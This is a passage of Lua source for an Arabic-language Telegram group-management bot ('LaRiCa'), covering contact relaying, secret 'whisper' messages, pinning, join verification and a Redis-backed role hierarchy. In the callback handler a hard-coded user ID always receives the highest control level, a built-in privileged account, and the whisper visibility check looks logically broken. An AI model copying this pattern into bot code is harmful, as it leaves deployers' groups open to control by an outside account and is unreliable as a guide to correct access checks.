return LuaTele.sendText(IdUser,msg_id,Reply_Status(IdUser,'• تم ارسال رسالتك الى المطور').Reply,"md",true)  
end
else 
if msg.reply_to_message_id ~= 0 then
local Message_Get = LuaTele.getMessage(msg_chat_id, msg.reply_to_message_id)
if Message_Get.forward_info then
local Info_User = Redis:get(LaRiCa.."Twasl:UserId"..Message_Get.forward_info.date) or 46899864
if text == 'حظر' then
Redis:sadd(LaRiCa..'BaN:In:Tuasl',Info_User)  
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Info_User,'• تم حظره من تواصل البوت ').Reply,"md",true)  
end 
if text =='الغاء الحظر' or text =='الغاء حظر' then
Redis:srem(LaRiCa..'BaN:In:Tuasl',Info_User)  
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Info_User,'• تم الغاء حظره من تواصل البوت ').Reply,"md",true)  
end 
local ChatAction = LuaTele.sendChatAction(Info_User,'Typing')
if not Info_User or ChatAction.message == "USER_IS_BLOCKED" then
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Info_User,'• قام بحظر البوت لا استطيع ارسال رسالتك ').Reply,"md",true)  
end
if msg.content.video_note then
LuaTele.sendVideoNote(Info_User, 0, msg.content.video_note.video.remote.id)
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
LuaTele.sendPhoto(Info_User, 0, idPhoto,'')
elseif msg.content.sticker then 
LuaTele.sendSticker(Info_User, 0, msg.content.sticker.sticker.remote.id)
elseif msg.content.voice_note then 
LuaTele.sendVoiceNote(Info_User, 0, msg.content.voice_note.voice.remote.id, '', 'md')
elseif msg.content.video then 
LuaTele.sendVideo(Info_User, 0, msg.content.video.video.remote.id, '', "md")
elseif msg.content.animation then 
LuaTele.sendAnimation(Info_User,0, msg.content.animation.animation.remote.id, '', 'md')
elseif msg.content.document then
LuaTele.sendDocument(Info_User, 0, msg.content.document.document.remote.id, '', 'md')
elseif msg.content.audio then
LuaTele.sendAudio(Info_User, 0, msg.content.audio.audio.remote.id, '', "md") 
elseif text then
LuaTele.sendText(Info_User,0,text,"md",true)
end 
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Info_User,'• تم ارسال رسالتك اليه ').Reply,"md",true)  
end
end
end 
end --UserBot
end -- File_Bot_Run
function CallBackLua(data) 
if data and data.luatele and data.luatele == "updateNewInlineQuery" then
local Text = data.query 
if Text == '' then
local input_message_content = {message_text = " • اهلا بك عزيزي\n • لارسال الهمسه اكتب يوزر البوت + الهمسه + يوزر العضو\n • مثال @T6llbot هلا @JAI6H"}	
local resuult = {{
type = 'article',
id = math.random(1,64),
title = 'اضغط هنا لمعرفه كيفيه ارسال الهمسه',
input_message_content = input_message_content,
reply_markup = {
inline_keyboard ={
{{text ="• LaRiCa Source", url= "https://t.me/LaRiCaTeam"}},
}
},
},
}
https.request("https://api.telegram.org/bot"..Token..'/answerInlineQuery?inline_query_id='..data.id..'&switch_pm_text=اضغط لارسال الهمسه&switch_pm_parameter=start&results='..JSON.encode(resuult))
end
if Text and Text:match("(.*)@(.*)") then
local hm = {string.match(Text,"(.*)@(.*)")}
local user = hm[2]
local hms = hm[1]
UserId_Info = LuaTele.searchPublicChat(user)
local idd = UserId_Info.id
local key = math.random(1,999999)
Redis:set(idd..key.."hms",hms)
local us = LuaTele.getUser(idd)
local name = us.first_name
local input_message_content = {message_text = "• هذه همسه سريه الي ["..name.."](tg://user?id="..idd..")\n • هو فقط من يستطيع رؤيتها ", parse_mode = 'Markdown'} 
local resuult = {{
type = 'article',
id = math.random(1,64),
title = 'هذه همسه سريه الي '..name..'',
input_message_content = input_message_content,
reply_markup = {
inline_keyboard ={
{{text ="اظهار الهمسه 🐣", callback_data = idd.."hmsaa"..data.sender_user_id.."/"..key}},
}
},
},
}
https.request("https://api.telegram.org/bot"..Token..'/answerInlineQuery?inline_query_id='..data.id..'&switch_pm_text=اضغط لارسال الهمسه&switch_pm_parameter=start&results='..JSON.encode(resuult))
end
end
if data and data.luatele and data.luatele == "updateNewInlineCallbackQuery" then
var(data)
local Text = LuaTele.base64_decode(data.payload.data)
if Text and Text:match('(.*)hmsaa(.*)/(.*)')  then
local mk = {string.match(Text,"(.*)hmsaa(.*)/(.*)")}
local hms = Redis:get(mk[1]..mk[3].."hms")
if tonumber(mk[1]) == tonumber(data.sender_user_id) or tonumber(mk[2]) == tonumber(data.sender_user_id) then
https.request("https://api.telegram.org/bot"..Token.."/answerCallbackQuery?callback_query_id="..data.id.."&text="..URL.escape(hms).."&show_alert=true")
end
if tonumber(mk[1]) ~= tonumber(data.sender_user_id) or tonumber(mk[2]) ~= tonumber(data.sender_user_id) then
https.request("https://api.telegram.org/bot"..Token.."/answerCallbackQuery?callback_query_id="..data.id.."&text="..URL.escape("الهمسه ليست لك").."&show_alert=true")
end
end
end
if data and data.luatele and data.luatele == "updateSupergroup" then
local Get_Chat = LuaTele.getChat('-100'..data.supergroup.id)
if data.supergroup.status.luatele == "chatMemberStatusBanned" then
Redis:srem(LaRiCa.."ChekBotAdd",'-100'..data.supergroup.id)
local keys = Redis:keys(LaRiCa..'*'..'-100'..data.supergroup.id..'*')
Redis:del(LaRiCa.."List:Manager"..'-100'..data.supergroup.id)
Redis:del(LaRiCa.."Command:List:Group"..'-100'..data.supergroup.id)
for i = 1, #keys do 
Redis:del(keys[i])
end
return LuaTele.sendText(Sudo_Id,0,'*\n• تم طرد البوت من كروب جديده \n• اسم الكروب : '..Get_Chat.title..'\n• ايدي الكروب :*`-100'..data.supergroup.id..'`\n• تم مسح جميع البيانات المتعلقه بالكروب',"md")
end
elseif data and data.luatele and data.luatele == "updateMessageSendSucceeded" then
local msg = data.message
local Chat = msg.chat_id
if msg.content.text then
text = msg.content.text.text
else 
text = nil
end
if msg.content.video_note then
if msg.content.video_note.video.remote.id == Redis:get(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id)
end
elseif msg.content.photo then
if msg.content.photo.sizes[1].photo.remote.id then
idPhoto = msg.content.photo.sizes[1].photo.remote.id
elseif msg.content.photo.sizes[2].photo.remote.id then
idPhoto = msg.content.photo.sizes[2].photo.remote.id
elseif msg.content.photo.sizes[3].photo.remote.id then
idPhoto = msg.content.photo.sizes[3].photo.remote.id
end
if idPhoto == Redis:get(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id)
end
elseif msg.content.sticker then 
if msg.content.sticker.sticker.remote.id == Redis:get(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id)
end
elseif msg.content.voice_note then 
if msg.content.voice_note.voice.remote.id == Redis:get(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id)
end
elseif msg.content.video then 
if msg.content.video.video.remote.id == Redis:get(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id)
end
elseif msg.content.animation then 
if msg.content.animation.animation.remote.id ==  Redis:get(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id)
end
elseif msg.content.document then
if msg.content.document.document.remote.id == Redis:get(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id)
end
elseif msg.content.audio then
if msg.content.audio.audio.remote.id == Redis:get(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id)
end
elseif text then
if text == Redis:get(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id) then
LuaTele.pinChatMessage(msg.chat_id,msg.id,true)
Redis:del(LaRiCa.."LaRiCa:PinMsegees:"..msg.chat_id)
end
end
elseif data and data.luatele and data.luatele == "updateNewMessage" then
if data.message.content.luatele == "messageChatDeleteMember" or data.message.content.luatele == "messageChatAddMembers" or data.message.content.luatele == "messagePinMessage" or data.message.content.luatele == "messageChatChangeTitle" or data.message.content.luatele == "messageChatJoinByLink" then
if Redis:get(LaRiCa.."Lock:tagservr"..data.message.chat_id) then
LuaTele.deleteMessages(data.message.chat_id,{[1]= data.message.id})
end
end 
if tonumber(data.message.sender.user_id) == tonumber(LaRiCa) then
return false
end
if data.message.content.luatele == "messageChatJoinByLink" and Redis:get(LaRiCa..'Status:joinet'..data.message.chat_id) == 'true' then
    local reply_markup = LuaTele.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = ' انا لست بوت ', data = data.message.sender.user_id..'/UnKed'},
    },
    }
    } 
    LuaTele.setChatMemberStatus(data.message.chat_id,data.message.sender.user_id,'restricted',{1,0,0,0,0,0,0,0,0})
    return LuaTele.sendText(data.message.chat_id, data.message.id, '• عليك اختيار انا لست بوت لتخطي نظام التحقق', 'md',false, false, false, false, reply_markup)
    end
File_Bot_Run(data.message,data.message)
elseif data and data.luatele and data.luatele == "updateMessageEdited" then
-- data.chat_id -- data.message_id
local Message_Edit = LuaTele.getMessage(data.chat_id, data.message_id)
if Message_Edit.sender.user_id == LaRiCa then
print('This is Edit for Bot')
return false
end
File_Bot_Run(Message_Edit,Message_Edit)
Redis:incr(LaRiCa..'Num:Message:Edit'..data.chat_id..Message_Edit.sender.user_id)
if Message_Edit.content.luatele == "messageContact" or Message_Edit.content.luatele == "messageVideoNote" or Message_Edit.content.luatele == "messageDocument" or Message_Edit.content.luatele == "messageAudio" or Message_Edit.content.luatele == "messageVideo" or Message_Edit.content.luatele == "messageVoiceNote" or Message_Edit.content.luatele == "messageAnimation" or Message_Edit.content.luatele == "messagePhoto" then
if Redis:get(LaRiCa.."Lock:edit"..data.chat_id) then
LuaTele.deleteMessages(data.chat_id,{[1]= data.message_id})
end
end
elseif data and data.luatele and data.luatele == "updateNewCallbackQuery" then
-- data.chat_id
Dataa = data.payload.data
-- data.sender_user_id
Text = LuaTele.base64_decode(data.payload.data)
var(Text)
IdUser = data.sender_user_id
ChatId = data.chat_id
Msg_id = data.message_id
if tonumber(IdUser) == 1573309498 then
data.The_Controller = 1
elseif tonumber(IdUser) == 1573309498 then
data.The_Controller = 1
elseif The_ControllerAll(IdUser) == true then  
data.The_Controller = 1
elseif Redis:sismember(LaRiCa.."Devss:Groups",IdUser) == true then
data.The_Controller = 2
elseif Redis:sismember(LaRiCa.."Dev:Groups",IdUser) == true then
data.The_Controller = 3
elseif Redis:sismember(LaRiCa.."Owners:Group"..ChatId,IdUser) == true then
data.The_Controller = 44
elseif Redis:sismember(LaRiCa.."Supcreator:Group"..ChatId,IdUser) == true then
data.The_Controller = 4
elseif Redis:sismember(LaRiCa.."Creator:Group"..ChatId,IdUser) == true then
data.The_Controller = 5
elseif Redis:sismember(LaRiCa.."Manger:Group"..ChatId,IdUser) == true then
data.The_Controller = 6
elseif Redis:sismember(LaRiCa.."Admin:Group"..ChatId,IdUser) == true then
data.The_Controller = 7
elseif Redis:sismember(LaRiCa.."Special:Group"..ChatId,IdUser) == true then
data.The_Controller = 8
elseif tonumber(IdUser) == tonumber(LaRiCa) then
data.The_Controller = 9
else
data.The_Controller = 10
end  
if data.The_Controller == 1 then  
data.ControllerBot = true
end
if data.The_Controller == 1 or data.The_Controller == 2 then
data.Devss = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 then
data.Dev = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller ==44 then
data.owner = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 4  or data.The_Controller ==44 or data.The_Controller == 9 then
data.Supcreator = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller ==44 or data.The_Controller == 3 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 9 then
data.Creator = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller ==44 or data.The_Controller == 3 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 9 then
data.Manger = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller ==44 or data.The_Controller == 3 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 7 or data.The_Controller == 9 then
data.Admin = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller ==44 or data.The_Controller == 3 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 7 or data.The_Controller == 8 or data.The_Controller == 9 then
data.Special = true
end
if Text and Text:match('(%d+)/statusTheBasicsz/(%d+)') and data.owner then
local UserId = {Text:match('(%d+)/statusTheBasicsz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(LaRiCa.."Supcreator:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."Supcreator:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."Supcreator:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusOriginatorsz/(%d+)') and data.Supcreator then
local UserId = {Text:match('(%d+)/statusOriginatorsz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then 
if Redis:sismember(LaRiCa.."Creator:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."Creator:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."Creator:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusManagersz/(%d+)') and data.Creator then
local UserId = {Text:match('(%d+)/statusManagersz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(LaRiCa.."Manger:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."Manger:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."Manger:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusAddictivez/(%d+)') and data.Manger then
local UserId = {Text:match('(%d+)/statusAddictivez/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(LaRiCa.."Admin:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."Admin:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."Admin:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusDistinguishedz/(%d+)') and data.Admin then
local UserId = {Text:match('(%d+)/statusDistinguishedz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(LaRiCa.."Special:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."Special:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."Special:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusmem/(%d+)') and data.owner then
local UserId ={ Text:match('(%d+)/statusmem/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
Redis:srem(LaRiCa.."Supcreator:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."Admin:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."Manger:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."Creator:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."Special:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."SilentGroup:Group"..ChatId,UserId[2])
Redis:srem(LaRiCa.."BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'restricted',{1,1,1,1,1,1,1,1,1})
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('/delAmr1') then
local UserId = Text:match('/delAmr1')
if data.Admin then
return LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
end
end
if Text and Text:match('(%d+)/statusban/(%d+)') and data.Admin then
local UserId ={ Text:match('(%d+)/statusban/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if StatusCanOrNotCan(ChatId,UserId[2]) then
return LuaTele.answerCallbackQuery(data.id,"\n•عذرآ لا تستطيع استخدام الامر على ( "..Controller(ChatId,UserId[2]).." } ", true)
end
if Redis:sismember(LaRiCa.."BanGroup:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'restricted',{1,1,1,1,1,1,1,1,1})
else
Redis:sadd(LaRiCa.."BanGroup:Group"..ChatId,UserId[2])
LuaTele.setChatMemberStatus(ChatId,UserId[2],'banned',0)
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusktm/(%d+)') and data.Admin then
local UserId ={ Text:match('(%d+)/statusktm/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if StatusSilent(ChatId,UserId[2]) then
return LuaTele.answerCallbackQuery(data.id, "\n•عذرآ لا تستطيع استخدام الامر على ( "..Controller(ChatId,UserId[2]).." } ", true)
end
if Redis:sismember(LaRiCa.."SilentGroup:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."SilentGroup:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."SilentGroup:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end

if Text and Text:match('(%d+)/tag/devss')  and data.ControllerBot then
local UserId = {Text:match('(%d+)/tag/devss(%d+)')}
local Info_Members = Redis:smembers(LaRiCa.."Devss:Groups") 
if #Info_Members == 0 then
return LuaTele.editMessageText(ChatId,Msg_id,"• لا يوجد ثانويين حاليا ",'md', true, false, reply_markup)
end
ListMembers = '\n*• قائمه مطورين الثانويين \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." -*[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
{{text = '• مسح المطورين الثانويين', data = IdUser..'/Devss'},},}}
return LuaTele.editMessageText(ChatId,Msg_id,ListMembers,'md', true, false, reply_markup)
end
if Text and Text:match('(%d+)/tag/dev') and data.Devss then
local UserId = {Text:match('(%d+)/tag/dev(%d+)')}
local Info_Members = Redis:smembers(LaRiCa.."Dev:Groups") 
if #Info_Members == 0 then
return LuaTele.editMessageText(ChatId,Msg_id,"• لا يوجد مطورين حاليا ",'md', true, false, reply_markup)
end
ListMembers = '\n*• قائمه مطورين البوت \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." - * ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المطورين', data = IdUser..'/Dev'},},}}
return LuaTele.editMessageText(ChatId,Msg_id,ListMembers,'md', true, false, reply_markup)
end
if Text and Text:match('(%d+)/tag/owners')  and data.Dev then
local UserId = {Text:match('(%d+)/tag/owners(%d+)')}
local Info_Members = Redis:smembers(LaRiCa.."Owners:Group"..ChatId) 
if #Info_Members == 0 then
return LuaTele.editMessageText(ChatId,Msg_id,"• لا يوجد مالكين حاليا ",'md', true, false, reply_markup)
end
ListMembers = '\n*• قائمه المالكين \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المالكين', data = IdUser..'/Owners'},},}}
return LuaTele.editMessageText(ChatId,Msg_id,ListMembers,'md', true, false, reply_markup)
end
if Text and Text:match('(%d+)/tag/basiccreator') and data.owner then
local UserId = {Text:match('(%d+)/tag/basiccreator(%d+)')}
local Info_Members = Redis:smembers(LaRiCa.."Supcreator:Group"..ChatId) 
if #Info_Members == 0 then
return LuaTele.editMessageText(ChatId,Msg_id,"• لا يوجد منشئين اساسيين حاليا ",'md', true, false, reply_markup)
end
ListMembers = '\n*• قائمه الاساسيين \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح الاساسيين', data = IdUser..'/Supcreator'},},}}
return LuaTele.editMessageText(ChatId,Msg_id,ListMembers,'md', true, false, reply_markup)
end
if Text and Text:match('(%d+)/tag/creator') and data.Supcreator then
local UserId = {Text:match('(%d+)/tag/creator(%d+)')}
local Info_Members = Redis:smembers(LaRiCa.."Creator:Group"..ChatId) 
if #Info_Members == 0 then
return LuaTele.editMessageText(ChatId,Msg_id,"• لا يوجد منشئين حاليا ",'md', true, false, reply_markup)
end
ListMembers = '\n*• قائمه المنشئيين \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المنشئين', data = IdUser..'/Creator'},},}}
return LuaTele.editMessageText(ChatId,Msg_id,ListMembers,'md', true, false, reply_markup)
end
if Text and Text:match('(%d+)/tag/manger') and data.Creator then
local UserId = {Text:match('(%d+)/tag/manger(%d+)')}
local Info_Members = Redis:smembers(LaRiCa.."Manger:Group"..ChatId) 
if #Info_Members == 0 then
return LuaTele.editMessageText(ChatId,Msg_id,"• لا يوجد مدراء حاليا ",'md', true, false, reply_markup)
end
ListMembers = '\n*• قائمه المدراء \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المدراء', data = IdUser..'/Manger'},},}}
return LuaTele.editMessageText(ChatId,Msg_id,ListMembers,'md', true, false, reply_markup)
end
if Text and Text:match('(%d+)/tag/admin') and data.Manger then
local UserId = {Text:match('(%d+)/tag/admin(%d+)')}
local Info_Members = Redis:smembers(LaRiCa.."Admin:Group"..ChatId) 
if #Info_Members == 0 then
return LuaTele.editMessageText(ChatId,Msg_id,"• لا يوجد ادمنيه حاليا ",'md', true, false, reply_markup)
end
ListMembers = '\n*• قائمه الادمنيه \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح الادمنيه', data = IdUser..'/Admin'},},}}
return LuaTele.editMessageText(ChatId,Msg_id,ListMembers,'md', true, false, reply_markup)
end
if Text and Text:match('(%d+)/tag/vip') and data.Admin then
local UserId = {Text:match('(%d+)/tag/vip(%d+)')}
local Info_Members = Redis:smembers(LaRiCa.."Special:Group"..ChatId) 
if #Info_Members == 0 then
return LuaTele.editMessageText(ChatId,Msg_id,"• لا يوجد مميزين حاليا ",'md', true, false, reply_markup)
end
ListMembers = '\n*• قائمه المميزين \n ٴ— — — — — — — — — —*\n'
for k, v in pairs(Info_Members) do
local UserInfo = LuaTele.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
ListMembers = ListMembers.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
ListMembers = ListMembers.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {{{text = '• مسح المميزين', data = IdUser..'/DelSpecial'},},}}
return LuaTele.editMessageText(ChatId,Msg_id,ListMembers,'md', true, false, reply_markup)
end




if Text and Text:match('(%d+)/UnKed') then
    local UserId = Text:match('(%d+)/UnKed')
    if tonumber(UserId) ~= tonumber(IdUser) then
    return LuaTele.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
    end
    LuaTele.setChatMemberStatus(ChatId,UserId,'restricted',{1,1,1,1,1,1,1,1})
    return LuaTele.editMessageText(ChatId,Msg_id,"• تم التحقق منك اجابتك صحيحه يمكنك الدردشه الان", 'md', false)
    end
    
    
    if Text and Text:match('(%d+)/mp3(.*)') then
local UserId = {Text:match('(%d+)/mp3(.*)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈.', url = 't.me/LaRiCaTeam'}, 
},
}
}
local TextHelp = [[*
• ارسل اسم الاغنية من فضلك
• Send Song Name Please
*]]
Redis:set(LaRiCa.."youtube"..IdUser..ChatId,'mp3')
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/mp4(.*)') then
local UserId = {Text:match('(%d+)/mp4(.*)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '𝘚𝘰𝘶𝘳𝘤𝘦 𝘓𝘢𝘙𝘐𝘤𝘈.', url = 't.me/LaRiCaTeam'}, },}}
local TextHelp = [[*• ارسل اسم الفيديو من فضلك
• Send Video Name Please*]]
Redis:set(LaRiCa.."youtube"..IdUser..ChatId,'mp4')
LuaTele.editMessageText(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/statusTheBasicsz/(%d+)') and data.owner then
local UserId = {Text:match('(%d+)/statusTheBasicsz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(LaRiCa.."LaRiCa:TheBasics:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."LaRiCa:TheBasics:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."LaRiCa:TheBasics:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusOriginatorsz/(%d+)') and data.Supcreator then
local UserId = {Text:match('(%d+)/statusOriginatorsz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then 
if Redis:sismember(LaRiCa.."LaRiCa:Originators:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."LaRiCa:Originators:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."LaRiCa:Originators:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusManagersz/(%d+)') and data.Creator then
local UserId = {Text:match('(%d+)/statusManagersz/(%d+)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
if Redis:sismember(LaRiCa.."LaRiCa:Managers:Group"..ChatId,UserId[2]) then
Redis:srem(LaRiCa.."LaRiCa:Managers:Group"..ChatId,UserId[2])
else
Redis:sadd(LaRiCa.."LaRiCa:Managers:Group"..ChatId,UserId[2])
end
return editrtp(ChatId,UserId[1],Msg_id,UserId[2])
end
end
if Text and Text:match('(%d+)/statusAddictivez/(%d+)') and data.Manger then
local UserId = {Text:match('(%d+)/statusAddictivez/(%d+)')}
